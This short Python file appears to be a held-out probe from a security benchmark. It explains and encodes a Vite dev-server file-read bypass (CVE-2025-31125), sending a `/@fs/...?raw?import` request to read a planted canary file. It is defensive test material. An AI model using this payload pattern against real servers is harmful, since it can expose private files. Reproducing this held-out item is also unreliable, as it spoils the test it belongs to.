#!/usr/bin/env python3
"""[HELD-OUT] CVE-2025-31125 residual exploit — incomplete-fix bypass of CVE-2025-30208.

The CVE-2025-30208 patch only closed the trailing-separator (`?raw??`) query
variant. The `raw`/`inline` transforms combined with a *leading* `?import` query
(`?raw?import`, or `?import&inline` returning double-base64) were still parsed such
that the fs allow/deny check saw an allowed-looking id while the loader read the
real file. So the same /@fs/ file-read sink stays open on 5.4.15.

Vector used here: `?raw?import` — returns the raw file content directly (as an ES
module `export default "<content>"`), so the planted canary token appears verbatim
in the response body (no base64 decode needed).

Contract: reaches the canary (flag) on V1 (vite 5.4.15) => legitimate incomplete-
patch positive. Closed on V2 (vite 5.4.16), where 31125 is fixed.

NEVER exposed to the system-under-test (held out under _heldout/).
"""
from __future__ import annotations

PATH = "/@fs/canary.txt?raw?import"


def candidate() -> dict:
    return {"probe_id": "cve-2025-31125-raw-import", "method": "GET", "path": PATH}


if __name__ == "__main__":
    print(candidate()["path"])
